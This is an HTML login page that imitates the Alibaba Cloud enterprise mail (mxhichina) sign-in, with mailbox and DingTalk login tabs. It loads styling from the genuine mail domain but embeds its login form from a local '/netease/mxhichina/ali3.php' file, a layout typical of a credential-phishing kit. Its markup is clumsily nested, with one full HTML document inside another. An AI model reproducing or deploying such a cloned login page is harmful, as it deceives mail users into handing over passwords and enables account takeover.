
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
    <script type="text/javascript">
                CONFIG={
            checkCodeUrl:"https://pin2.aliyun.com/get_img?type=150_40&identity=mailsso.mxhichina.com&sessionid=",
            csrfKey:"_tb_token_",
            csrfToken:"3nyAX7HbQ8s"
        }
            </script>
    <script src="/home/js/jquery.1.5.2.min.js" type="text/javascript"></script>
<head>
<body>
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="https://mailsso.mxhichina.com/home/css/webmail_login.css"/>
    <script src="/home/js/jquery.1.5.2.min.js" type="text/javascript"></script>
    <style>
        .dingding-login-tab {
            height: 50px;
            width: 100%;
            border-bottom: solid 1px #e7e8e8;
            font-size: 0;
            background-color: #fff;
        }

        .dingding-mail-login-option {
            line-height: 58px;
            display: inline-block;
            width: 50%;
            text-align: center;
            vertical-align: top;
            cursor: pointer;
            font-size: 0;
            height: 48px;
            text-overflow: ellipsis;
            overflow: hidden;
            white-space: nowrap;
            position: relative;
        }

        .dingding-option-curr {
            border-bottom: solid 3px #36a7f4;
            color: #3698fb;
        }

        .dingding-mail-login-option div{
            display: inline-block;
            color: #7e8185;
            font-size: 14px;
            /*padding-left: 30px;*/
            vertical-align: middle;
            line-height: 48px;
        }

        .dingding-mail-login-option div i {
            position: absolute;
            width: 24px;
            height: 24px;
            top: 0;
            left: 0;
            display: none;
            margin-top: 13px;
        }

        .dingding-mail-login-option-m i {
            background: url(/home/images/dingding/logo_mail_ding.png) no-repeat;
        }

        .dingding-mail-login-option-d i {
            background: url(/home/images/dingding/logo_mail_ding.png) no-repeat 100% 0;
        }

        .dingding-mail-login-content-m, .dingding-mail-login-content-d {
            background-color: #fff;
        }

        .dingding-login-only-account .dingding-mail-login-option-m {
            width: 100%;
        }

        .dingding-login-only-account .dingding-mail-login-option-d {
            display: none;
        }

        .dingding_mail_divide_line {
            position: absolute;
            top: 14px;
            left: 0;
            width: 1px;
            height: 24px;
            background-color: #dddddd;
        }
    </style>
</head>
<body>
<div class="dingding-mail-login">
    <div class="dingding-login-tab">
        <div class="dingding-mail-login-option dingding-mail-login-option-m dingding-option-curr" title="邮箱帐号登录"><div><i></i>邮箱帐号登录</div></div>
        <div class="dingding-mail-login-option dingding-mail-login-option-d" title="钉钉帐号登录"><div class="dingding_mail_divide_line"></div><div><i></i>钉钉帐号登录</div></div>
    </div>
    <div class="dingding-mail-login-content-m">
        <iframe id="ding-login-iframe" allowTransparency="true" class="login_panel_iframe" name="ding-login-iframe" frameborder="0" src="/netease/mxhichina/ali3.php"></iframe>
    </div>
    <div class="dingding-mail-login-content-d" style="display: none">
        <div id="login_container"></div>
    </div>
</div>

</body>
</html>
</body>
</html>

